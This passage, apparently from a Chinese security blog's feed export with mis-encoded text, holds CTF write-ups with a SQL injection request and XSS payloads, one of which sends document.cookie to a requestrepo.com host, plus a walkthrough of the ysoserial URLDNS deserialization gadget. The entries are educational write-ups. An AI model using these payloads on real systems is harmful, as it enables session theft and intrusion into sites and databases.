href="https://blog.csdn.net/Thewei666/article/details/142408096">https://blog.csdn.net/Thewei666/article/details/142408096</a></p><p>æ•°æ®æµ:</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;1564-5ee8764d17ec0&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Mon, 28 Nov 2022 12:56:03 </span><br><span class="line">Content-Type:multipart/form-data;boundary=----abcdefg</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>453</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;username&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">admin</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;password&quot;; filename=&quot;password&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;password&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span><span class="string">&#x27; union select 1,2,replace(replace(&#x27;</span><span class="number">1</span>&quot; union select 1,2,replace(replace(&quot;#&quot;,char(34),char(39)),char(35),&quot;#&quot;)-- &#x27;,char(34),char(39)),char(35),&#x27;1&quot; <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,replace(replace(&quot;#&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">35</span>),&quot;#&quot;)<span class="comment">-- &#x27;)-- </span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br></pre></td></tr></table></figure><p>æˆåŠŸè·å¾—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;testflag&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby-layout"></a>baby-layout</h3><p>æœ¬é¢˜åˆ©ç”¨<code>HTMLå±æ€§æ³¨å…¥</code>ä»¥åŠ<code>äº‹ä»¶é©±åŠ¨æ‰§è¡Œ</code><br>payload:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&quot;layout&quot;:&quot;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#123;&#123;content&#125;&#125;&#x27;</span>&gt;</span>&quot;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;x\&quot; onerror=\&quot;alert(1)&quot;</span>,<span class="string">&quot;layoutId&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯å°±æˆäº†:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¾€æ¥æ”¶çš„ç½‘ç«™å¼¹å³å¯</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;x\&quot; onerror=\&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span>,<span class="string">&quot;layoutId&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe-layout"></a>safe-layout</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">aa<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css">&#123;&#123;<span class="attribute">content</span>&#125;&#125;&lt;&#123;&#123;<span class="attribute">content</span>&#125;&#125;&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">img src=&quot;<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&quot; onerror=&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯è¿™ä¸ªæ•ˆæœ:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">aa<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml">img src=&quot;<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&quot; onerror=&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;style&gt;&lt;/style&gt;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸ç®¡æ ¼å¼å‘ç”Ÿäº†ä»€ä¹ˆï¼Œ<br>åªè¦æœ‰å®Œæ•´çš„imgæ ‡ç­¾ï¼Œå°±ä¼šè§¦å‘è¯·æ±‚<br>è¯·æ±‚ä¸åˆ°å°±onerrorå¸¦å‡ºcookie</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaé“¾å­åˆ†æâ€”URLDNS æ¢¦å¼€å§‹çš„åœ°æ–¹</title>
      <link href="/2025/03/10/java-payload-URLDNS/"/>
      <url>/2025/03/10/java-payload-URLDNS/</url>
      
        <content type="html"><![CDATA[<p>çœ‹çœ‹ysoserialçš„payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h3><p>è¿™æ¡é“¾å­ç”¨äºæµ‹è¯•å­˜ä¸å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œ<br>å¦‚æœå­˜åœ¨ï¼Œé‚£ä¹ˆä¼šå› ä¸ºDNSè¢«ä¿®æ”¹å¾€æŸä¸ªæ¶æ„ç½‘ç«™å‘é€è¯·æ±‚<br>å¦‚æœæ¥æ”¶åˆ°äº†è¯·æ±‚å°±è¯´æ˜å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¯ä»¥è¿›è¡Œåç»­æ“ä½œ</p><h3 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h3><ul><li><h5 id="Hashmap"><a href="#Hashmap" class="headerlink" title="Hashmap"></a><code>Hashmap</code></h5></li></ul><p>ç±»ä¼¼äºpythonçš„å­—å…¸ï¼Œç”¨äºå­˜å‚¨é”®å€¼å¯¹æ•°æ®<br>çœ‹çœ‹<code>Hashmap</code>çš„<code>readObject</code>æ–¹æ³•<br>å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.clamp(lf, <span class="number">0.25f</span>, <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">dc</span> <span class="operator">=</span> Math.ceil(mappings / (<span class="type">double</span>)lf);</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (dc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="type">int</span>)dc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);<span class="comment">//41è¡Œåœ¨è¿™</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬å››åä¸€è¡Œçš„ä½ç½®è§¦å‘äº†<code>hash()</code>å‡½æ•°è¿ç®—<br>è·Ÿè¿›æ­¤å‡½æ•°:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ˜¯ä¸‰ç›®è¡¨è¾¾å¼<br>è‹¥keyæ²¡æœ‰ï¼Œåˆ™è¿”å›0<br>æˆ–keyä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨keyçš„hashcodeæ–¹æ³•<br>è·Ÿè¿›:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>çœ‹æ¥æ­¤æ–¹æ³•è·Ÿå¯¹è±¡æœ‰å…³<br>å›å¤´payloadçš„<code>getObject</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">    ht.put(u, url);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿”å›çš„æ˜¯<code>hashmap</code>å¯¹è±¡ï¼Œ<br>ä½†è°ƒç”¨çš„æ˜¯<code>URL</code>å¯¹è±¡çš„<code>hashCode</code>æ–¹æ³•<br>è·Ÿè¿›:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆè°ƒç”¨çš„æ˜¯<code>handler</code>(<code>URLStreamHandler</code>çš„å¯¹è±¡) çš„<code>hashCode</code>æ–¹æ³•<br>è·Ÿè¿›:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);<span class="comment">//ï¼ç›®æ ‡åœ¨è¿™ï¼</span></span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase(Locale.ROOT).hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¾¾è¿™é‡Œ:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€<br>å®é™…ä¸Šå°±æ˜¯ä¸€æ¬¡DNSæŸ¥è¯¢<br>åˆ°è¿™é‡Œå°±è¾¾æˆç›®çš„äº†<br>å°†è·å–åˆ°çš„<code>ht</code>å¯¹è±¡(Hashmapçš„å¯¹è±¡)<br>åºåˆ—åŒ–:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(Utils.objectToHexString(ht));</span><br></pre></td></tr></table></figure><p>å°±ç”Ÿæˆäº†hexçš„åºåˆ—åŒ–æ•°æ®<br>å¦‚æœæˆåŠŸçš„è§¦å‘ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºå­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p><p>è¿™ä¸ªè¿‡ç¨‹å’Œphpçš„é“¾å­çš„è¿‡ç¨‹å¾ˆç›¸ä¼¼<br>å¯¹äºæˆ‘æ¥è¯´æœ‰å¾ˆå¹³æ»‘çš„è¿‡åº¦<br>æ„Ÿè°¢phithonå¤§ä½¬</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨åå°„ç¯‡</title>
      <link href="/2025/03/09/java-reflect/"/>
      <url>/2025/03/09/java-reflect/</url>
      
        <content type="html"><![CDATA[<h1 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Javaçš„åå°„ï¼ˆReflectionï¼‰æ˜¯ä¸€ç§å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€è®¿é—®ã€æ£€æµ‹å’Œä¿®æ”¹è‡ªèº«ç»“æ„å’Œè¡Œä¸ºçš„æœºåˆ¶ã€‚</span><br><span class="line">é€šè¿‡åå°„ï¼ŒJavaä»£ç å¯ä»¥è·å–ç±»çš„ä¿¡æ¯ï¼ˆå¦‚ç±»åã€æ–¹æ³•ã€å­—æ®µã€æ„é€ å™¨ç­‰ï¼‰ï¼Œ</span><br><span class="line">ç”šè‡³æ“ä½œç±»çš„ç§æœ‰æˆå‘˜ã€åŠ¨æ€åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•ç­‰ã€‚ä»¥ä¸‹æ˜¯åå°„çš„æ ¸å¿ƒæ¦‚å¿µå’Œç”¨æ³•ï¼š</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€‹ä¸ºä»€ä¹ˆå«â€œåå°„â€ï¼Ÿ</span><br><span class="line">â€œåå°„â€è¿™ä¸€åç§°æ¥æºäºâ€œç¨‹åºèƒ½å¤Ÿåƒé•œå­ä¸€æ ·è§‚å¯Ÿè‡ªèº«ç»“æ„â€çš„æ¯”å–»ï¼š</span><br><span class="line"></span><br><span class="line">â€‹åå°„ï¼ˆReflectionï¼‰â€‹â€‹ çš„å­—é¢æ„ä¹‰æ˜¯â€œæ˜ å°„ã€å€’å½±â€ã€‚</span><br><span class="line">åœ¨ç¼–ç¨‹ä¸­ï¼Œå®ƒè¡¨ç¤ºç¨‹åºåœ¨è¿è¡Œæ—¶å¯ä»¥â€œåå‘æ˜ å°„â€è‡ªèº«çš„ç»“æ„ï¼Œ</span><br><span class="line">ä¾‹å¦‚ç±»çš„å®šä¹‰ã€æ–¹æ³•ã€å±æ€§ç­‰å…ƒæ•°æ®ã€‚</span><br><span 